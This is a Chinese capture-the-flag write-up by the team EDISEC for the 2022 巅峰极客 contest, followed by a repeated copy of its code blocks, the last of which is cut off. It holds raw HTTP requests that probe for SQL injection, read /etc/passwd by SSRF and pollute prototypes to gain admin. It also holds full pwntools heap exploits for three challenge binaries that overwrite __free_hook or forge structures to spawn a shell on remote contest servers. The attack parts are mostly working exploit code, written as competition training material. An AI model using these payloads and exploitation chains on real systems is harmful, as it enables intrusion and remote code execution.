# 2022巅峰极客WriteUp By EDISEC

> 原文: https://www.ctfiot.com/53840.html
> ID: 53840

点击蓝字 ·  关注我们

01

Web

1

babyweb

提示Padding oracle 直接随便在⽹上找个脚本搓了半天没什么反应，后来直接⽤padbuster跑就⾏了 跑出密码为

0f90844e-f214-4f0b-aaa3-687a8098b896

flag{fc0e4a89-0689-4f56-bab5-9dc90357a58e}

2

ezWeb

POST /readf/feedback.php HTTP/1.1Host: 123.56.236.86:38267User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101Firefox/83.0Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 84Origin: http://123.56.236.86:38267Connection: closeReferer: http://123.56.236.86:38267/review/review.phpCookie: PHPSESSID=ddh5padgd13hsfap4lkpg4lrs6Upgrade-Insecure-Requests: 1X-Forwarded-For: 127.0.0.1X-Originating-IP: 127.0.0.1X-Remote-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1worksafe2=on&updatable2=1&crawldepth2=&crawlpages2=&crawltype2=1&startid=0*&endid=0

POST /ban/ban.php HTTP/1.1Host: 123.56.236.86:38267User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101Firefox/83.0Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 43Origin: http://123.56.236.86:38267Connection: closeReferer: http://123.56.236.86:38267/tags/tags.phpCookie: PHPSESSID=ddh5padgd13hsfap4lkpg4lrs6Upgrade-Insecure-Requests: 1X-Forwarded-For: 127.0.0.1X-Originating-IP: 127.0.0.1X-Remote-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1delete=on&url=file%3A%2F%2F%2Fetc%2Fpasswd*

02

Crypto

1

point-power

联⽴解⽅程

p =3660057339895840489386133099442699911046732928957592389841707990239494988668972633881890332850396642253648817739844121432749159024098337289268574006090698602263783482687565322890623b =1515231655397326550194746635613443276271228200149130229724363232017068662367771757907474495021697632810542820366098372870766155947779533427141016826904160784021630942035315049381147x1 =2157670468952062330453195482606118809236127827872293893648601570707609637499023981195730090033076249237356704253400517059411180554022652893726903447990650895219926989469443306189740x2 =1991876990606943816638852425122739062927245775025232944491452039354255349384430261036766896859410449488871048192397922549895939187691682643754284061389348874990018070631239671589727P.<a>=GF(p)[]y1_2=x1^3+a*x1+bf=y1_2*4*(x1*2+x2)-(3*x1^2+a)^2l=f.roots()for a,_ in l:print(bytes.fromhex(hex(a)[2:]))

2

strange curve

from Crypto.Util.number import *x,y=P =(56006392793427940134514899557008545913996191831278248640996846111183757392968770895731003245209281149,5533217632352976155681815016236825302418119286774481415122941272968513081846849158651480192550482691343283818244963282636939305751909505213138032238524899)print(long_to_bytes(x))

03

Pwn

1

Gift

#coding:utf-8import sysfrom pwn import *from ctypes import CDLLcontext.log_level='debug'elfelf='./pwn'#context.arch='amd64'while True : # try : elf=ELF(elfelf) context.arch=elf.arch gdb_text=''' telescope $rebase(0x202040) 16 ''' if len(sys.argv)==1 : clibc=CDLL('/lib/x86_64-linux-gnu/libc-2.27.so') io=process(elfelf) gdb_open=1 # io=process(['./'],env={'LD_PRELOAD':'./'}) clibc.srand(clibc.time(0)) libc=ELF('/lib/x86_64-linux-gnu/libc-2.27.so') # ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247] else : clibc=CDLL('/lib/x86_64-linux-gnu/libc-2.27.so') io=remote('123.56.121.45',32308) gdb_open=0 clibc.srand(clibc.time(0)) libc=ELF('/lib/x86_64-linux-gnu/libc-2.27.so') # ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so') one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247] def gdb_attach(io,a): if gdb_open==1 : gdb.attach(io,a) def choice(a): io.sendlineafter('your choice:n',str(a)) def add(a,b): choice(2) io.sendlineafter('your choice:n',str(a)) io.sendafter('n',b) def edit(a,b): choice(5) io.sendlineafter('n',str(a)) io.sendlineafter('n',str(b)) def show(a): choice(4) io.sendlineafter('n',str(a)) def delete(a): choice(3) io.sendlineafter('n',str(a)) add(2,(p64(0)+p64(0x111))*0x5) add(1,(p64(0)+p64(0x111))*0xf) add(2,(p64(0)+p64(0x111))*0x5) delete(0) delete(1) delete(2) show(2) io.recvuntil('cost: ') heap_base=int(io.recvuntil('type:',drop=True)[:-1])edit(2,-0x50) add(2,(p64(0)+p64(0x111))*0x4) add(2,p64(0)+p64(0x111)+p64(heap_base&0xfffffffffffff000)) add(1,(p64(0)+p64(0x111))*0xf) add(1,p8(6)*0x8+p8(7)*8+p64(heap_base&0xfffffffffffff000+0x200)*0x18) delete(1) show(1) io.recvuntil('cost: ') libc_base=int(io.recvuntil('type:',drop=True)[:-1])-libc.sym['__malloc_hook']-96-0x10 libc.address=libc_base bin_sh_addr=libc.search('/bin/shx00').next() system_addr=libc.sym['system'] free_hook_addr=libc.sym['__free_hook'] delete(0) add(1,p64(free_hook_addr-0x10)*0x18) add(2,'/bin/shx00'*0xa) add(2,p64(system_addr)) delete(4) success('libc_base:'+hex(libc_base)) success('heap_base:'+hex(heap_base)) gdb_attach(io,gdb_text) io.interactive() # except Exception as e: # io.close() # continue # else: # continue

2

smallcontainer

#coding:utf-8import sysfrom pwn import *from ctypes import CDLLcontext.log_level='debug'elfelf='./smallcontainer'#context.arch='amd64'while True : # try : elf=ELF(elfelf)context.arch=elf.arch gdb_text=''' telescope $rebase(0x202040) 16 ''' if len(sys.argv)==1 : clibc=CDLL('/lib/x86_64-linux-gnu/libc-2.27.so') io=process(elfelf) gdb_open=1 # io=process(['./'],env={'LD_PRELOAD':'./'}) clibc.srand(clibc.time(0)) libc=ELF('/lib/x86_64-linux-gnu/libc-2.27.so') # ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so') one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247] else : clibc=CDLL('/lib/x86_64-linux-gnu/libc-2.27.so') io=remote('123.56.121.45',23606) gdb_open=0 clibc.srand(clibc.time(0)) libc=ELF('/lib/x86_64-linux-gnu/libc-2.27.so') # ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so') one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247] def gdb_attach(io,a): if gdb_open==1 : gdb.attach(io,a) def choice(a): io.sendlineafter('> ',str(a)) def add(a): choice(1) io.sendlineafter('Input size: ',str(a)) def edit(a,b): choice(3) io.sendlineafter('Input index: ',str(a)) sleep(0.1) io.send(b) def show(a): choice(4) io.sendlineafter('Input index: ',str(a)) def delete(a): choice(2) io.sendlineafter('Input index: ',str(a))add(0x1f8) add(0x1f8) add(0x1f8) add(0x208) add(0x1f8) add(0x1f8) add(0x1f8) add(0x1f8) add(0x1f8) add(0x1f8) add(0x1f8) for i in range(6): delete(5+i) delete(1) delete(0) edit(2,'a'*0x1f8) edit(2,'a'*0x1f0+p64(0x600)) edit(3,p64(0x21)*0x41) edit(4,p64(0x21)*0x3f) delete(3) add(0x278) show(0) libc_base=int(io.recv(12),16)-libc.sym['__malloc_hook']-1360-0x10 libc.address=libc_base bin_sh_addr=libc.search('/bin/shx00').next() system_addr=libc.sym['system'] free_hook_addr=libc.sym['__free_hook'] edit(0,'/bin/shx00'+'a'*0x1f0+p64(0x201)+p64(free_hook_addr)) add(0x1f8) add(0x1f8) edit(3,p64(system_addr)) delete(0) success('libc_base:'+hex(libc_base)) # success('heap_base:'+hex(heap_base)) gdb_attach(io,gdb_text) io.interactive() # except Exception as e: # io.close()# continue # else: # continue

3

happy_note

#coding:utf-8import sysfrom pwn import *from ctypes import CDLLcontext.log_level='debug'elfelf='./happy_note'#context.arch='amd64'while True : # try : elf=ELF(elfelf) context.arch=elf.arch gdb_text=''' telescope $rebase(0x202040) 16 ''' #patchelf --set-interpreter ./ld.so --replace-needed libc.so.6 ./libc.so.6 if len(sys.argv)==1 : clibc=CDLL('/lib/x86_64-linux-gnu/libc-2.31.so') io=process(elfelf) gdb_open=1 # io=process(['./'],env={'LD_PRELOAD':'./'}) clibc.srand(clibc.time(0)) libc=ELF('./libc.so.6') # ld = ELF('/lib/x86_64-linux-gnu/ld-2.31.so') one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247] else : clibc=CDLL('/lib/x86_64-linux-gnu/libc-2.31.so') io=remote('123.56.236.86',25546) gdb_open=0 clibc.srand(clibc.time(0)) libc=ELF('./libc.so.6') # ld = ELF('/lib/x86_64-linux-gnu/ld-2.31.so') one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247] def gdb_attach(io,a): if gdb_open==1 : gdb.attach(io,a) def choice(a): io.sendlineafter('>> ',str(a))def add(a,b,c): choice(1) io.sendlineafter('n',str(b)) io.sendlineafter('n',str(a)) io.sendlineafter('n',str(c)) def edit(a,b): choice(4) io.sendlineafter('n',str(a)) io.sendafter('n',b) def show(a): choice(3) io.sendlineafter('n',str(a)) def delete(a): choice(2) io.sendlineafter('n',str(a)) def back(a): choice(666) io.sendlineafter('n',str(a)) for i in range(8): add(i,0x1f8,1) for i in range(7): delete(1+i) back(0) add(1,0xe8,1) add(0xb,0x8,1) add(2,0xe8,1) for i in range(7): add(3+i,0xe8,1) for i in range(6): delete(4+i) delete(2) delete(3) delete(1) show(0) io.recvuntil('content: ') heap_base=u64(io.recv(6)+'x00x00')+0x120-0x1000add(1,0xe8,1) add(3,0xe8,1) delete(3) delete(1) show(0) libc_base=u64(io.recvuntil('x7f')[-6:]+'x00x00')-0x219cc0 libc.address=libc_base bin_sh_addr=libc.search('/bin/shx00').next() system_addr=libc.sym['system'] free_hook_addr=libc.sym['__free_hook'] add(1,0xe8,1) add(3,0xe8,1) addr=(libc_base+0x2282A0+0x10)^(heap_base>>12) edit(0,'a'*0xe8+p64(0x21)+'a'*0x18+p64(0xf1)+p64(addr)) add(4,0xe8,2) add(5,0xe8,2) # edit(5,'a'*0x18) show(5) io.recvuntil('content: ') key=u64(io.recv(6)+'x00x00') fake=heap_base+0x1580 shell=libc_base+0xeacec add(6,0x1f8,1) add(7,0x1f8,1) pay='x00'*0x28+p64(fake) pay+='x00'*0x18+p64(fake+0x58)+p64(8) pay+=p64(shell) pay=pay.ljust(0x110,'x00') pay+=p64(fake+0x40)+p64(0)+p64(fake+0x48) edit(6,pay) edit(7,'x00'*0x11c+p32(9)) edit(5,p64(key)+p64(fake)) success('libc_base:'+hex(libc_base)) success('heap_base:'+hex(heap_base)) # success('key:'+hex(key)) gdb_attach(io,gdb_text) io.interactive() # except Exception as e:# io.close() # continue # else: # continue

04

决赛

1

开端：strangeTempreture

2

nodesystem

POST /api HTTP/1.1 Host: eci-2ze2703izi24gnau171h.cloudeci1.ichunqiu.com User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko Accept: / Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 61 Origin: http://eci-2ze2703izi24gnau171h.cloudeci1.ichunqiu.com Connection: close Referer: http://eci-2ze2703izi24gnau171h.cloudeci1.ichunqiu.com/ X-Forwarded-For: 127.0.0.1 X-Originating-IP: 127.0.0.1 X-Remote-IP: 127.0.0.1 X-Remote-Addr: 127.0.0.1 auth%5bname%5d=test&auth%5bpassword%5d=test&filename=index.js

读⽂件只能读当前⽬录 获取flag必须要是admin

第⼀步污染

PUT /message HTTP/1.1 Host: eci-2ze2703izi24gnau171h.cloudeci1.ichunqiu.com User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/json Content-Length: 89 Origin: http://eci-2ze2703izi24gnau171h.cloudeci1.ichunqiu.com Connection: close Referer: http://eci-2ze2703izi24gnau171h.cloudeci1.ichunqiu.com/ X-Forwarded-For: 127.0.0.1 X-Originating-IP: 127.0.0.1 X-Remote-IP: 127.0.0.1 X-Remote-Addr: 127.0.0.1 {"message":{"__proto__": {"admin": true}}, "auth":{"name":"test", "password":"test"}}

POST /debug HTTP/1.1 Host: eci-2ze2703izi24gnau171h.cloudeci1.ichunqiu.com User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/json Content-Length: 89 Origin: http://eci-2ze2703izi24gnau171h.cloudeci1.ichunqiu.com Connection: close Referer: http://eci-2ze2703izi24gnau171h.cloudeci1.ichunqiu.com/ X-Forwarded-For: 127.0.0.1 X-Originating-IP: 127.0.0.1 X-Remote-IP: 127.0.0.1 X-Remote-Addr: 127.0.0.1 {"message":{"__proto__": {"admin": true}}, "auth":{"name":"test", "password":"test"}}

2

gcd

#conding:utf-8from Crypto.Util.number import *x =13693034247131001247611357013365838905472128629161269384100755984286945944986882779020879733934334461215591081830359749241927901759168319107452036275703768755532293338513836146556306490425526394420440685291299327486258632666082657664827474947846307949205548526817689180357262646108048851554962291154624349603853599623877095789135051759890435127891210971940795915429197420232561510826760487552089621705187244655827668509013761027910519038664267576214742561936826964572261315984043602119812357324667105678247267841445497640859880436819217418374184256023378843611198818733281625017307272013394628328908242726204785568269e = 65537n =1715097516831775561161353747739509313962850384763754284193603064705990003183954750857689649540587082555847904377918426763475079170697690469267290454724999354302036981034615698694153403754870938739225201770934147845874793740053505575413463153429315475539039712818850905666950096326806695688446947957198050957270336443016980023115464136303403780696015358461369838964806435293267645492940773964907954737849962270208167145137818071024789445448292917016422004351584109968952746852305729861258178402122017513103311904147173869605944992973485253275501741635308107788593258463591060922145241960065862813218690280146883588390356662245698217956617720339878472430817614915509896516775918109916920083183701011823993137753987826242193055167215287839864164955881557719443664876504155709359476375455266912247205663953373944852046907623883953483708248467223346798885142046228485310724692353541792975390854356153906879056788972704718688261213c =1207106262178445359018459948589897274651891185968586806427714234447059397099330669443037189913958678506147447588787686432870791586266645067569198511010947847769438531195366288233395081813524859121328300315116211130908169351354477893647936383056584771268247471788727296968981371535384241445434057942795625350351461517179136190258136244456887118978348223420158887403238429201791427682781494296473806409015961385580794909106746874670027369932286414096790928966277930586468864071103687837936910843559150279603968747213779555572156135983177121194768041838538456267670795923361920648635769732101772513407467158904982779342496410211785417729464008786654808126619152228029357660596380038858050797654917902576424059433048290426186067840363899227577713800670585547473870112798624948349947633855963137174688403113603549470708467306886181387445601800049442519922530086418265660642841544022198981442640591637598035257382429976435264690303k = x * n-1p = n//GCD(pow(2,k,n)-1,n)q = n//p**2d = inverse(e,(p**2-p)*(q-1))print(long_to_bytes(pow(c,d,n)))#分解n 就完事了

3

babyProtocol

、

Tip

EDI安全的CTF战队经常参与各大CTF比赛，了解CTF赛事。

欢迎各位师傅加入EDI，大家一起打CTF，一起进步。（诚招re crypto pwn misc方向的师傅）

有意向的师傅请联系邮箱root@edisec.net、shiyi@edisec.net（带上自己的简历，简历内容包括但不限于就读学校、个人ID、擅长技术方向、历史参与比赛成绩等等）

EDI安全

扫二维码｜关注我们

一个专注渗透实战经验分享的公众号


```
POST /readf/feedback.php HTTP/1.1Host: 123.56.236.86:38267User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101Firefox/83.0Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 84Origin: http://123.56.236.86:38267Connection: closeReferer: http://123.56.236.86:38267/review/review.phpCookie: PHPSESSID=ddh5padgd13hsfap4lkpg4lrs6Upgrade-Insecure-Requests: 1X-Forwarded-For: 127.0.0.1X-Originating-IP: 127.0.0.1X-Remote-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1worksafe2=on&updatable2=1&crawldepth2=&crawlpages2=&crawltype2=1&startid=0*&endid=0
```



```
POST /ban/ban.php HTTP/1.1Host: 123.56.236.86:38267User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101Firefox/83.0Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 43Origin: http://123.56.236.86:38267Connection: closeReferer: http://123.56.236.86:38267/tags/tags.phpCookie: PHPSESSID=ddh5padgd13hsfap4lkpg4lrs6Upgrade-Insecure-Requests: 1X-Forwarded-For: 127.0.0.1X-Originating-IP: 127.0.0.1X-Remote-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1delete=on&url=file%3A%2F%2F%2Fetc%2Fpasswd*
```



```
p =3660057339895840489386133099442699911046732928957592389841707990239494988668972633881890332850396642253648817739844121432749159024098337289268574006090698602263783482687565322890623b =1515231655397326550194746635613443276271228200149130229724363232017068662367771757907474495021697632810542820366098372870766155947779533427141016826904160784021630942035315049381147x1 =2157670468952062330453195482606118809236127827872293893648601570707609637499023981195730090033076249237356704253400517059411180554022652893726903447990650895219926989469443306189740x2 =1991876990606943816638852425122739062927245775025232944491452039354255349384430261036766896859410449488871048192397922549895939187691682643754284061389348874990018070631239671589727P.<a>=GF(p)[]y1_2=x1^3+a*x1+bf=y1_2*4*(x1*2+x2)-(3*x1^2+a)^2l=f.roots()for a,_ in l:print(bytes.fromhex(hex(a)[2:]))
```



```
from Crypto.Util.number import *x,y=P =(56006392793427940134514899557008545913996191831278248640996846111183757392968770895731003245209281149,5533217632352976155681815016236825302418119286774481415122941272968513081846849158651480192550482691343283818244963282636939305751909505213138032238524899)print(long_to_bytes(x))
```



```
#coding:utf-8import sysfrom pwn import *from ctypes import CDLLcontext.log_level='debug'elfelf='./pwn'#context.arch='amd64'while True : # try : elf=ELF(elfelf) context.arch=elf.arch gdb_text=''' telescope $rebase(0x202040) 16 ''' if len(sys.argv)==1 : clibc=CDLL('/lib/x86_64-linux-gnu/libc-2.27.so') io=process(elfelf) gdb_open=1 # io=process(['./'],env={'LD_PRELOAD':'./'}) clibc.srand(clibc.time(0)) libc=ELF('/lib/x86_64-linux-gnu/libc-2.27.so') # ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247] else : clibc=CDLL('/lib/x86_64-linux-gnu/libc-2.27.so') io=remote('123.56.121.45',32308) gdb_open=0 clibc.srand(clibc.time(0)) libc=ELF('/lib/x86_64-linux-gnu/libc-2.27.so') # ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so') one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247] def gdb_attach(io,a): if gdb_open==1 : gdb.attach(io,a) def choice(a): io.sendlineafter('your choice:n',str(a)) def add(a,b): choice(2) io.sendlineafter('your choice:n',str(a)) io.sendafter('n',b) def edit(a,b): choice(5) io.sendlineafter('n',str(a)) io.sendlineafter('n',str(b)) def show(a): choice(4) io.sendlineafter('n',str(a)) def delete(a): choice(3) io.sendlineafter('n',str(a)) add(2,(p64(0)+p64(0x111))*0x5) add(1,(p64(0)+p64(0x111))*0xf) add(2,(p64(0)+p64(0x111))*0x5) delete(0) delete(1) delete(2) show(2) io.recvuntil('cost: ') heap_base=int(io.recvuntil('type:',drop=True)[:-1])edit(2,-0x50) add(2,(p64(0)+p64(0x111))*0x4) add(2,p64(0)+p64(0x111)+p64(heap_base&0xfffffffffffff000)) add(1,(p64(0)+p64(0x111))*0xf) add(1,p8(6)*0x8+p8(7)*8+p64(heap_base&0xfffffffffffff000+0x200)*0x18) delete(1) show(1) io.recvuntil('cost: ') libc_base=int(io.recvuntil('type:',drop=True)[:-1])-libc.sym['__malloc_hook']-96-0x10 libc.address=libc_base bin_sh_addr=libc.search('/bin/shx00').next() system_addr=libc.sym['system'] free_hook_addr=libc.sym['__free_hook'] delete(0) add(1,p64(free_hook_addr-0x10)*0x18) add(2,'/bin/shx00'*0xa) add(2,p64(system_addr)) delete(4) success('libc_base:'+hex(libc_base)) success('heap_base:'+hex(heap_base)) gdb_attach(io,gdb_text) io.interactive() # except Exception as e: # io.close() # continue # else: # continue
```



```
#coding:utf-8import sysfrom pwn import *from ctypes import CDLLcontext.log_level='debug'elfelf='./smallcontainer'#context.arch='amd64'while True : # try : elf=ELF(elfelf)context.arch=elf.arch gdb_text=''' telescope $rebase(0x202040) 16 ''' if len(sys.argv)==1 : clibc=CDLL('/lib/x86_64-linux-gnu/libc-2.27.so') io=process(elfelf) gdb_open=1 # io=process(['./'],env={'LD_PRELOAD':'./'}) clibc.srand(clibc.time(0)) libc=ELF('/lib/x86_64-linux-gnu/libc-2.27.so') # ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so') one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247] else : clibc=CDLL('/lib/x86_64-linux-gnu/libc-2.27.so') io=remote('123.56.121.45',23606) gdb_open=0 clibc.srand(clibc.time(0)) libc=ELF('/lib/x86_64-linux-gnu/libc-2.27.so') # ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so') one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247] def gdb_attach(io,a): if gdb_open==1 : gdb.attach(io,a) def choice(a): io.sendlineafter('> ',str(a)) def add(a): choice(1) io.sendlineafter('Input size: ',str(a)) def edit(a,b): choice(3) io.sendlineafter('Input index: ',str(a)) sleep(0.1) io.send(b) def show(a): choice(4) io.sendlineafter('Input index: ',str(a)) def delete(a): choice(2) io.sendlineafter('Input index: ',str(a))add(0x1f8) add(0x1f8) add(0x1f8) add(0x208) add(0x1f8) add(0x1f8) add(0x1f8) add(0x1f8) add(0x1f8) add(0x1f8) add(0x1f8) for i in range(6): delete(5+i) delete(1) delete(0) edit(2,'a'*0x1f8) edit(2,'a'*0x1f0+p64(0x600)) edit(3,p64(0x21)*0x41) edit(4,p64(0x21)*0x3f) delete(3) add(0x278) show(0) libc_base=int(io.recv(12),16)-libc.sym['__malloc_hook']-1360-0x10 libc.address=libc_base bin_sh_addr=libc.search('/bin/shx00').next() system_addr=libc.sym['system'] free_hook_addr=libc.sym['__free_hook'] edit(0,'/bin/shx00'+'a'*0x1f0+p64(0x201)+p64(free_hook_addr)) add(0x1f8) add(0x1f8) edit(3,p64(system_addr)) delete(0) success('libc_base:'+hex(libc_base)) # success('heap_base:'+hex(heap_base)) gdb_attach(io,gdb_text) io.interactive() # except Exception as e: # io.close()# continue # else: # continue
```



```
#coding:utf-8import sysfrom pwn import *from ctypes import CDLLcontext.log_level='debug'elfelf='./happy_note'#context.arch='amd64'while True : # try : elf=ELF(elfelf) context.arch=elf.arch gdb_text=''' telescope $rebase(0x202040) 16 ''' #patchelf --set-interpreter ./ld.so --replace-needed libc.so.6 ./libc.so.6 if len(sys.argv)==1 : clibc=CDLL('/lib/x86_64-linux-gnu/libc-2.31.so') io=process(elfelf) gdb_open=1 # io=process(['./'],env={'LD_PRELOAD':'./'}) clibc.srand(clibc.time(0)) libc=ELF('./libc.so.6') # ld = ELF('/lib/x86_64-linux-gnu/ld-2.31.so') one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247] else : clibc=CDLL('/lib/x86_64-linux-gnu/libc-2.31.so') io=remote('123.56.236.86',25546) gdb_open=0 clibc.srand(clibc.time(0)) libc=ELF('./libc.so.6') # ld = ELF('/lib/x86_64-linux-gnu/ld-2.31.so') one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247] def gdb_attach(io,a): if gdb_open==1 : gdb.attach(io,a) def choice(a): io.sendlineafter('>> ',str(a))def add(a,b,c): choice(1) io.sendlineafter('n',str(b)) io.sendlineafter('n',str(a)) io.sendlineafter('n',str(c)) def edit(a,b): choice(4) io.sendlineafter('n',str(a)) io.sendafter('n',b) def show(a): choice(3) io.sendlineafter('n',str(a)) def delete(a): choice(2) io.sendlineafter('n',str(a)) def back(a): choice(666) io.sendlineafter('n',str(a)) for i in range(8): add(i,0x1f8,1) for i in range(7): delete(1+i) back(0) add(1,0xe8,1) add(0xb,0x8,1) add(2,0xe8,1) for i in range(7): add(3+i,0xe8,1) for i in range(6): delete(4+i) delete(2) delete(3) delete(1) show(0) io.recvuntil('content: ') heap_base=u64(io.recv(6)+'x00x00')+0x120-0x1000add(1,0xe8,1) add(3,0xe8,1) delete(3) delete(1) show(0) libc_base=u64(io.recvuntil('x7f')[-6:]+'x00x00')-0x219cc0 libc.address=libc_base bin_sh_addr=libc.search('/bin/shx00').next() system_addr=libc.sym['system'] free_hook_addr=libc.sym['__free_hook'] add(1,0xe8,1) add(3,0xe8,1) addr=(libc_base+0x2282A0+0x10)^(heap_base>>12) edit(0,'a'*0xe8+p64(0x21)+'a'*0x18+p64(0xf1)+p64(addr)) add(4,0xe8,2) add(5,0xe8,2) # edit(5,'a'*0x18) show(5) io.recvuntil('content: ') key=u64(io.recv(6)+'x00x00') fake=heap_base+0x1580 shell=libc_base+0xeacec add(6,0x1f8,1) add(7,0x1f8,1) pay='x00'*0x28+p64(fake) pay+='x00'*0x18+p64(fake+0x58)+p64(8) pay+=p64(shell) pay=pay.ljust(0x110,'x00') pay+=p64(fake+0x40)+p64(0)+p64(fake+0x48) edit(6,pay) edit(7,'x00'*0x11c+p32(9)) edit(5,p64(key)+p64(fake)) success('libc_base:'+hex(libc_base)) success('heap_base:'+hex(heap_base)) # success('key:'+hex(key)) gdb_attach(io,gdb_text) io.interactive() # except Exception as e:# io.close() # continue # else: # continue
```



```
POST /api HTTP/1.1 Host: eci-2ze2703izi24gnau171h.cloudeci1.ichunqiu.com User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko Accept: / Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 61 Origin: http://eci-2ze2703izi24gnau171h.cloudeci1.ichunqiu.com Connection: close Referer: http://eci-2ze2703izi24gnau171h.cloudeci1.ichunqiu.com/ X-Forwarded-For: 127.0.0.1 X-Originating-IP: 127.0.0.1 X-Remote-IP: 127.0.0.1 X-Remote-Addr: 127.0.0.1 auth%5bname%5d=test&auth%5bpassword%5d=test&filename=index.js
```



```
PUT /message HTTP/1.1 Host: eci-2ze2703izi24gnau171h.cloudeci1.ichunqiu.com User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/json Content-Length: 89 Origin: http://eci-2ze2703izi24gnau171h.cloudeci1.ichunqiu.com Connection: close Referer: http://eci-2ze2703izi24gnau171h.cloudeci1.ichunqiu.com/ X-Forwarded-For: 127.0.0.1 X-Originating-IP: 127.0.0.1 X-Remote-IP: 127.0.0.1 X-Remote-Addr: 127.0.0.1 {"message":{"__proto__": {"admin": true}}, "auth":{"name":"test", "password":"test"}}
```



```
POST /debug HTTP/1.1 Host: eci-2ze2703izi24gnau171h.cloudeci1.ichunqiu.com User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/json Content-Length: 89 Origin: http://eci-2ze2703izi24gnau171h.cloudeci1.ichunqiu.com Connection: close Referer: http://eci-2ze2703izi24gnau171h.cloudeci1.ichunqiu.com/ X-Forwarded-For: 127.0.0.1 X-Originating-IP: 127.0.0.1 X-Remote-IP: 127.0.0.1 X-Remote-Addr: 127.0.0.1 {"message":{"__proto__": {"admin": true}}, "auth":{"name":"test", "password":"test"}}
```



```
#conding:utf-8from Crypto.Util.number import *x =13693034247131001247611357013365838905472128629161269384100755984286945944986882779020879733934334461215591081830359749241927901759168319107452036275703768755532293338513836146556306490425526394420440685291299327486258632666082657664827474947846307949205548526817689180357262646108048851554962291154624349603853599623877095789135051759890435127891210971940795915429197420232561510826760487552089621705187244655827668509013761027910519038664267576214742561936826964572261315984043602119812357324667105678247267841445497640859880436819217418374184256023378843611198818733281625017307272013394628328908242726204785568269e = 65537n =1715097516831775561161353747739509313962850384763754284193603064705990003183954750857689649540587082555847904377918426763475079170697690469267290454724999354302036981034615698694153403754870938739225201770934147845874793740053505575413463153429315475539039712818850905666950096326806695688446947957198050957270336443016980023115464136303403780696015358461369838964806435293267645492940773964907954737849962270208167145137818071024789445448292917016422004351584109968952746852305729861258178402122017513103311904147173869605944992973485253275501741635308107788593258463591060922145241960065862813218690280146883588390356662245698217956617720339878472430817614915509896516775918109916920083183701011823993137753987826242193055167215287839864164955881557719443664876504155709359476375455266912247205663953373944852046907623883953483708248467223346798885142046228485310724692353541792975390854356153906879056788972704718688261213c =1207106262178445359018459948589897274651891185968586806427714234447059397099330669443037189913958678506147447588787686432870791586266645067569198511010947847769438531195366288233395081813524859121328300315116211130908169351354477893647936383056584771268247471788727296968981371535384241445434057942795625350351461517179136190258136244456887118978348223420158887403238429201791427682781494296473806409015961385580794909106746874670027369932286414096790928966277930586468864071103687837936910843559150279603968747213779555572156135983177121194768041838538456267670795923361920648635769732101772513407467158904982779342496410211785417729464008786654808126619152228029357660596380038858050797654917902576424059433048290426186067840363899227577713800670585547473870112798624948349947633855963137174688403113603549470708467306886181387445601800049442519922530086418265660642841544022198981442640591637598035257382429976435264690303k = x * n-1p = n//GCD(pow(2,k,n)-1,n)q = n//p**2d = 